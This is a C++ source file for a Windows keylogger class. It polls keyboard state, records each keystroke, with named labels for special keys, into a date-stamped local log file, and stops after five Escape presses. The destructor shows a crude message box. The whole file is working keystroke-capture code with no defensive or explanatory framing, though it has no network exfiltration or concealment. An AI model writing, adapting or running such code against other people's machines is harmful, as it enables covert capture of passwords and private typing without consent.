#include "Keylogger.h"
#include <Windows.h>

Keylogger::Keylogger(const char * _fileName) : fileName(_fileName), escapeCounter(0)
{
	if (isCreatedFile())
		saveKeys();
}

Keylogger::Keylogger() : escapeCounter(0)
{
	getNameOfFileFromLocalDate();

	if (isCreatedFile())
		saveKeys();
}

Keylogger::~Keylogger()
{
	fclose(file);
	MessageBox(NULL, "Closing, little fucker", "Information", MB_ICONINFORMATION);
}

void Keylogger::getNameOfFileFromLocalDate()
{
	SYSTEMTIME time;
	GetLocalTime(&time);

	fileName = "log_" + std::to_string(time.wDay) + "." + std::to_string(time.wMonth) \
				+ "." + std::to_string(time.wYear) + "_" + std::to_string(time.wHour) \
				+ "." + std::to_string(time.wMinute) + ".txt";
}

bool Keylogger::isCreatedFile()
{
	fopen_s(&file, fileName.c_str(), "a+");

	if (file != NULL)
		return true;
	else
	{
		MessageBox(NULL, "Error - can't create file", "Information", MB_ICONINFORMATION);
		return false;
	}
}

void Keylogger::saveKeys()
{
	while (escapeCounter < 5)
		checkKey();
}

void Keylogger::checkKey()
{
	for (int i = 8; i <= 190; i++)
	{
		if (GetAsyncKeyState(i) == -32767)
		{
			saveKeyToFile(i);
			countIfEscape(i);
		}
	}
}

void Keylogger::saveKeyToFile(int pressedKey)
{
	switch (pressedKey)
	{
	case 8:
		fprintf(file, "%s", "[BACKSPACE]");
		break;
	case 9:
		fprintf(file, "%s", "[TAB]");
		break;
	case 13:
		fprintf(file, "%s", "\n[RETURN]\n");
		break;
	case 16:
		fprintf(file, "%s", "[SHIFT]");
		break;
	case 17:
		fprintf(file, "%s", "[CTRL]");
		break;
	case 18:
		fprintf(file, "%s", "[ALT]");
		break;
	case 19:
		fprintf(file, "%s", "[PAUSE]");
		break;
	case 20:
		fprintf(file, "%s", "[CAPSLOCK]");
		break;
	case 27:
		fprintf(file, "%s", "[ESC]");
		break;
	case 32:
		fprintf(file, "%s", " [SPACE] ");
		break;
	case 33:
		fprintf(file, "%s", "[PAGE_UP]");
		break;
	case 34:
		fprintf(file, "%s", "[PAGE_DOWN]");
		break;
	case 35:
		fprintf(file, "%s", "[END]");
		break;
	case 36:
		fprintf(file, "%s", "[HOME]");
		break;
	case 37:
		fprintf(file, "%s", "[LEFT]");
		break;
	case 38:
		fprintf(file, "%s", "[UP]");
		break;
	case 39:
		fprintf(file, "%s", "[RIGHT]");
		break;
	case 40:
		fprintf(file, "%s", "[DOWN]");
		break;
	case 44:
		fprintf(file, "%s", "[PRINT_SCREEN]");
		break;
	case 45:
		fprintf(file, "%s", "[INSERT]");
		break;
	case 46:
		fprintf(file, "%s", "[DELETE]");
		break;
	case 91:
		fprintf(file, "%s", "[L_WIN]");
		break;
	case 92:
		fprintf(file, "%s", "[R_WIN]");
		break;
	case 112:
		fprintf(file, "%s", "[F1]");
		break;
	case 113:
		fprintf(file, "%s", "[F2]");
		break;
	case 114:
		fprintf(file, "%s", "[F3]");
		break;
	case 115:
		fprintf(file, "%s", "[F4]");
		break;
	case 116:
		fprintf(file, "%s", "[F5]");
		break;
	case 117:
		fprintf(file, "%s", "[F6]");
		break;
	case 118:
		fprintf(file, "%s", "[F7]");
		break;
	case 119:
		fprintf(file, "%s", "[F8]");
		break;
	case 120:
		fprintf(file, "%s", "[F9]");
		break;
	case 121:
		fprintf(file, "%s", "[F10]");
		break;
	case 122:
		fprintf(file, "%s", "[F11]");
		break;
	case 123:
		fprintf(file, "%s", "[F12]");
		break;
	default:
		fprintf(file, "%s", &pressedKey);
		break;
	}
}

void Keylogger::countIfEscape(int pressedKey)
{
	if (pressedKey == 27)
		escapeCounter++;
	else
		escapeCounter = 0;
}
